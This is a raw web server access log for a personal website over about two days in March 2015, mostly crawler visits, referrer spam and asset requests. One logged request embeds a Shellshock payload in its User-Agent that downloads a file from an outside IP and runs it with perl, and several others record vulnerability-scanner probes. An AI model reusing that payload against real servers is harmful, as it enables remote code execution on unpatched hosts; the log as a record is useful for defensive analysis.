79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
180.76.4.172 - - [02/Mar/2015:12:47:19 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
178.137.92.19 - - [02/Mar/2015:12:48:39 +0000] "GET / HTTP/1.1" 200 2869 "http://xn--80ahdks.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4"
178.137.92.19 - - [02/Mar/2015:12:48:39 +0000] "GET / HTTP/1.1" 200 2869 "http://xn--80ahdks.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4"
178.137.92.19 - - [02/Mar/2015:12:48:40 +0000] "GET / HTTP/1.1" 200 2869 "http://xn--80ahdks.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4"
46.119.124.167 - - [02/Mar/2015:13:17:15 +0000] "GET / HTTP/1.1" 200 2869 "http://na-verh.ru/" "Opera/7.54 (Windows NT 5.1; U)  [pl]"
46.119.124.167 - - [02/Mar/2015:13:17:16 +0000] "GET / HTTP/1.1" 200 2869 "http://na-verh.ru/" "Opera/7.54 (Windows NT 5.1; U)  [pl]"
46.119.124.167 - - [02/Mar/2015:13:17:16 +0000] "GET / HTTP/1.1" 200 2869 "http://na-verh.ru/" "Opera/7.54 (Windows NT 5.1; U)  [pl]"
66.249.67.44 - - [02/Mar/2015:14:37:09 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.230 - - [02/Mar/2015:14:39:36 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.67.44 - - [02/Mar/2015:15:24:18 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.119.124.167 - - [02/Mar/2015:15:52:49 +0000] "GET / HTTP/1.1" 200 2869 "http://viktoria-center.ru/" "Opera/9.0 (Windows NT 5.1; U; en)"
46.119.124.167 - - [02/Mar/2015:15:52:49 +0000] "GET / HTTP/1.1" 200 2869 "http://viktoria-center.ru/" "Opera/9.0 (Windows NT 5.1; U; en)"
46.119.124.167 - - [02/Mar/2015:15:52:50 +0000] "GET / HTTP/1.1" 200 2869 "http://viktoria-center.ru/" "Opera/9.0 (Windows NT 5.1; U; en)"
195.242.218.133 - - [02/Mar/2015:16:20:04 +0000] "GET / HTTP/1.1" 200 2869 "http://chimiver.info/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.0 [en]"
195.242.218.133 - - [02/Mar/2015:16:20:05 +0000] "GET / HTTP/1.1" 200 2869 "http://chimiver.info/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.0 [en]"
195.242.218.133 - - [02/Mar/2015:16:20:05 +0000] "GET / HTTP/1.1" 200 2869 "http://chimiver.info/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.0 [en]"
180.76.4.191 - - [02/Mar/2015:16:40:37 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
180.76.4.252 - - [02/Mar/2015:18:47:28 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
46.119.124.167 - - [02/Mar/2015:18:56:18 +0000] "GET / HTTP/1.1" 200 2869 "http://nachalka21.ru/" "Mozilla/3.0 (compatible; WebCapture 2.0; Auto; Windows)"
46.119.124.167 - - [02/Mar/2015:18:56:18 +0000] "GET / HTTP/1.1" 200 2869 "http://nachalka21.ru/" "Mozilla/3.0 (compatible; WebCapture 2.0; Auto; Windows)"
46.119.124.167 - - [02/Mar/2015:18:56:19 +0000] "GET / HTTP/1.1" 200 2869 "http://nachalka21.ru/" "Mozilla/3.0 (compatible; WebCapture 2.0; Auto; Windows)"
46.119.115.79 - - [02/Mar/2015:19:47:50 +0000] "GET / HTTP/1.1" 200 2869 "http://www.knowed.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.01  [en]"
46.119.115.79 - - [02/Mar/2015:19:47:51 +0000] "GET / HTTP/1.1" 200 2869 "http://www.knowed.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.01  [en]"
46.119.115.79 - - [02/Mar/2015:19:47:51 +0000] "GET / HTTP/1.1" 200 2869 "http://www.knowed.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.01  [en]"
64.233.172.252 - - [02/Mar/2015:20:23:10 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
64.233.172.252 - - [02/Mar/2015:20:23:11 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
66.249.67.44 - - [02/Mar/2015:20:36:51 +0000] "GET /robots.txt HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.28 - - [02/Mar/2015:20:36:51 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.210 - - [02/Mar/2015:20:54:03 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
182.118.55.202 - - [02/Mar/2015:22:10:27 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
180.76.4.59 - - [02/Mar/2015:22:43:56 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
54.144.23.48 - - [02/Mar/2015:23:00:30 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
54.144.23.48 - - [02/Mar/2015:23:00:30 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 200 2869 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
180.76.4.180 - - [03/Mar/2015:00:40:36 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
180.76.4.197 - - [03/Mar/2015:02:48:24 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.67.28 - - [03/Mar/2015:03:17:16 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.119.115.79 - - [03/Mar/2015:03:36:48 +0000] "GET / HTTP/1.1" 200 2869 "http://getbot.guru/?pr=0bb7f2d00d979929148f79c3917b9371" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
46.119.115.79 - - [03/Mar/2015:03:36:49 +0000] "GET / HTTP/1.1" 200 2869 "http://getbot.guru/?pr=0bb7f2d00d979929148f79c3917b9371" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
46.119.115.79 - - [03/Mar/2015:03:36:49 +0000] "GET / HTTP/1.1" 200 2869 "http://getbot.guru/?pr=0bb7f2d00d979929148f79c3917b9371" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
157.55.39.209 - - [03/Mar/2015:03:53:15 +0000] "GET /robots.txt HTTP/1.1" 200 2869 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.4.186 - - [03/Mar/2015:04:44:07 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
157.55.39.209 - - [03/Mar/2015:05:24:59 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
208.115.113.89 - - [03/Mar/2015:06:25:54 +0000] "GET /robots.txt HTTP/1.1" 200 2869 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.4.26 - - [03/Mar/2015:06:43:47 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
46.119.124.167 - - [03/Mar/2015:06:57:55 +0000] "GET / HTTP/1.1" 200 2869 "http://bristolhotel.com.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) Babya Discoverer  8.0:"
46.119.124.167 - - [03/Mar/2015:06:57:55 +0000] "GET / HTTP/1.1" 200 2869 "http://bristolhotel.com.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) Babya Discoverer  8.0:"
46.119.124.167 - - [03/Mar/2015:06:57:56 +0000] "GET / HTTP/1.1" 200 2869 "http://bristolhotel.com.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) Babya Discoverer  8.0:"
157.55.39.219 - - [03/Mar/2015:07:31:37 +0000] "GET /about/ HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)"
157.55.39.255 - - [03/Mar/2015:07:32:06 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.96 - - [03/Mar/2015:07:32:34 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.219 - - [03/Mar/2015:07:32:59 +0000] "GET /robots.txt HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
208.115.113.89 - - [03/Mar/2015:08:19:54 +0000] "GET /about HTTP/1.1" 200 2869 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
199.30.25.100 - - [03/Mar/2015:08:33:10 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/about/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.100 - - [03/Mar/2015:08:33:10 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/about/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.100 - - [03/Mar/2015:08:33:10 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/about/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.100 - - [03/Mar/2015:08:33:10 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/about/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
157.55.39.219 - - [03/Mar/2015:08:33:50 +0000] "GET /robots.txt HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.4.166 - - [03/Mar/2015:08:42:41 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
207.46.13.66 - - [03/Mar/2015:09:17:30 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.67.28 - - [03/Mar/2015:09:49:48 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
188.138.17.205 - - [03/Mar/2015:10:19:00 +0000] "GET / HTTP/1.1" 200 2869 "-" "-"
188.138.17.205 - - [03/Mar/2015:10:19:00 +0000] "GET /robots.txt HTTP/1.1" 200 2869 "-" "-"
180.76.4.228 - - [03/Mar/2015:10:47:19 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
209.236.133.201 - - [03/Mar/2015:11:06:59 +0000] "GET /cgi-bin/sip.cgi HTTP/1.0" 200 2869 "-" "() { :;}; /bin/bash -c \x22cd /var/tmp ; wget http://151.236.44.210/ft.exe ; curl -O http://151.236.44.210/ft.exe;perl ft.exe;perl /var/tmp/ft.exe;perl ft.exe\x22"
89.163.227.197 - - [03/Mar/2015:11:19:08 +0000] "GET /vtigercrm/test/upload/vtigercrm.txt HTTP/1.1" 200 2869 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.16.2.3 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
91.207.8.46 - - [03/Mar/2015:11:29:33 +0000] "GET / HTTP/1.1" 200 2869 "http://skins4mine.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6"
91.207.8.46 - - [03/Mar/2015:11:29:34 +0000] "GET / HTTP/1.1" 200 2869 "http://skins4mine.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6"
91.207.8.46 - - [03/Mar/2015:11:29:34 +0000] "GET / HTTP/1.1" 200 2869 "http://skins4mine.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6"
200.153.128.151 - - [03/Mar/2015:11:34:52 +0000] "GET / HTTP/1.1" 200 1025 "http://semalt.semalt.com/crawler.php?u=http://matthewellsworth.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.153.128.151 - - [03/Mar/2015:11:34:52 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.153.128.151 - - [03/Mar/2015:11:34:52 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.153.128.151 - - [03/Mar/2015:11:34:52 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.153.128.151 - - [03/Mar/2015:11:34:53 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.153.128.151 - - [03/Mar/2015:11:34:53 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.153.128.151 - - [03/Mar/2015:11:34:53 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
128.61.240.66 - - [03/Mar/2015:12:09:47 +0000] "GET / HTTP/1.0" 200 2869 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
180.76.4.179 - - [03/Mar/2015:12:48:42 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
5.196.174.201 - - [03/Mar/2015:13:33:10 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 181 "-" "-"
180.76.4.96 - - [03/Mar/2015:14:46:04 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.67.36 - - [03/Mar/2015:15:02:13 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.80.78.133 - - [03/Mar/2015:15:03:31 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
54.80.78.133 - - [03/Mar/2015:15:03:31 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 200 2869 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
94.100.17.130 - - [03/Mar/2015:15:16:41 +0000] "GET //phppath/php HTTP/1.1" 200 2869 "-" "Mozilla/5.0 (Windows NT 6.1)"
66.249.67.36 - - [03/Mar/2015:15:22:29 +0000] "GET /rss/ HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.66 - - [03/Mar/2015:16:15:41 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.4.246 - - [03/Mar/2015:16:48:42 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
186.197.1.145 - - [03/Mar/2015:18:30:05 +0000] "GET / HTTP/1.1" 200 1025 "http://semalt.semalt.com/crawler.php?u=http://matthewellsworth.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
186.197.1.145 - - [03/Mar/2015:18:30:05 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
186.197.1.145 - - [03/Mar/2015:18:30:20 +0000] "GET /assets/bundle.js HTTP/1.1" 200 35590 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
180.76.4.28 - - [03/Mar/2015:18:51:08 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
178.137.92.19 - - [03/Mar/2015:19:03:21 +0000] "GET / HTTP/1.1" 200 2869 "http://moomi-daeri.com/" "Opera/9.00 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:21 +0000] "GET / HTTP/1.1" 200 2869 "http://blogig.org/" "Opera/9.0 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:21 +0000] "GET / HTTP/1.1" 200 2869 "http://bolshe.ru/" "Opera/9.0 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:21 +0000] "GET / HTTP/1.1" 200 2869 "http://blogig.org/" "Opera/9.0 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:21 +0000] "GET / HTTP/1.1" 200 2869 "http://bolshe.ru/" "Opera/9.0 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:21 +0000] "GET / HTTP/1.1" 200 2869 "http://moomi-daeri.com/" "Opera/9.00 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:22 +0000] "GET / HTTP/1.1" 200 2869 "http://blogig.org/" "Opera/9.0 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:22 +0000] "GET / HTTP/1.1" 200 2869 "http://bolshe.ru/" "Opera/9.0 (Windows NT 5.1; U; en)"
178.137.92.19 - - [03/Mar/2015:19:03:22 +0000] "GET / HTTP/1.1" 200 2869 "http://moomi-daeri.com/" "Opera/9.00 (Windows NT 5.1; U; en)"
66.249.67.36 - - [03/Mar/2015:20:42:43 +0000] "GET /robots.txt HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.44 - - [03/Mar/2015:20:42:43 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.178 - - [03/Mar/2015:20:50:53 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.80.3 - - [03/Mar/2015:21:30:22 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
66.249.80.3 - - [03/Mar/2015:21:30:22 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
180.76.4.94 - - [03/Mar/2015:22:42:29 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
188.165.15.234 - - [04/Mar/2015:00:03:58 +0000] "GET /robots.txt HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
46.119.115.79 - - [04/Mar/2015:00:05:09 +0000] "GET / HTTP/1.1" 200 2869 "https://informpora.ru/yellowpages/gelendzhik/1273/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
46.119.115.79 - - [04/Mar/2015:00:05:11 +0000] "GET / HTTP/1.1" 200 2869 "https://informpora.ru/yellowpages/gelendzhik/1273/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
46.119.115.79 - - [04/Mar/2015:00:05:12 +0000] "GET / HTTP/1.1" 200 2869 "https://informpora.ru/yellowpages/gelendzhik/1273/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
180.76.4.109 - - [04/Mar/2015:00:41:53 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
46.119.115.79 - - [04/Mar/2015:01:27:07 +0000] "GET / HTTP/1.1" 200 2869 "http://onigama.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FREE; .NET CLR 1.1.4322)"
46.119.115.79 - - [04/Mar/2015:01:27:09 +0000] "GET / HTTP/1.1" 200 2869 "http://onigama.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FREE; .NET CLR 1.1.4322)"
46.119.115.79 - - [04/Mar/2015:01:27:10 +0000] "GET / HTTP/1.1" 200 2869 "http://onigama.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FREE; .NET CLR 1.1.4322)"
69.10.51.234 - - [04/Mar/2015:01:32:52 +0000] "GET /user/soapCaller.bs HTTP/1.1" 200 1025 "-" "Morfeus Fucking Scanner"
180.76.4.194 - - [04/Mar/2015:02:52:08 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.67.44 - - [04/Mar/2015:03:29:24 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.66 - - [04/Mar/2015:04:14:23 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.4.75 - - [04/Mar/2015:04:47:05 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
180.76.4.177 - - [04/Mar/2015:06:47:58 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
54.161.2.222 - - [04/Mar/2015:06:57:59 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
54.161.2.222 - - [04/Mar/2015:06:57:59 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 200 2869 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
123.125.71.104 - - [04/Mar/2015:07:21:08 +0000] "GET /assets/css/icons/load/night.gif?v=2c203b62dd HTTP/1.1" 404 150 "-" "Baiduspider-image+(+http://www.baidu.com/search/spider.htm)\x5CnReferer: http://image.baidu.com/i?ct=503316480&z=0&tn=baiduimagedetail"
66.249.67.44 - - [04/Mar/2015:08:54:26 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.119.124.167 - - [04/Mar/2015:09:26:39 +0000] "GET / HTTP/1.1" 200 2869 "http://dostavka-v-ukrainu.ru/" "Opera/9.00 (Windows NT 5.1; U; ru)"
46.119.124.167 - - [04/Mar/2015:09:26:39 +0000] "GET / HTTP/1.1" 200 2869 "http://nacap.ru/" "Mozilla/4.76 [en] (Windows NT 5.0; U)"
46.119.124.167 - - [04/Mar/2015:09:26:40 +0000] "GET / HTTP/1.1" 200 2869 "http://dostavka-v-ukrainu.ru/" "Opera/9.00 (Windows NT 5.1; U; ru)"
46.119.124.167 - - [04/Mar/2015:09:26:40 +0000] "GET / HTTP/1.1" 200 2869 "http://nacap.ru/" "Mozilla/4.76 [en] (Windows NT 5.0; U)"
46.119.124.167 - - [04/Mar/2015:09:26:40 +0000] "GET / HTTP/1.1" 200 2869 "http://dostavka-v-ukrainu.ru/" "Opera/9.00 (Windows NT 5.1; U; ru)"
46.119.124.167 - - [04/Mar/2015:09:26:40 +0000] "GET / HTTP/1.1" 200 2869 "http://nacap.ru/" "Mozilla/4.76 [en] (Windows NT 5.0; U)"
94.153.66.163 - - [04/Mar/2015:10:33:03 +0000] "GET / HTTP/1.1" 200 2869 "http://10sotok.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
94.153.66.163 - - [04/Mar/2015:10:33:04 +0000] "GET / HTTP/1.1" 200 2869 "http://10sotok.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
94.153.66.163 - - [04/Mar/2015:10:33:05 +0000] "GET / HTTP/1.1" 200 2869 "http://10sotok.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
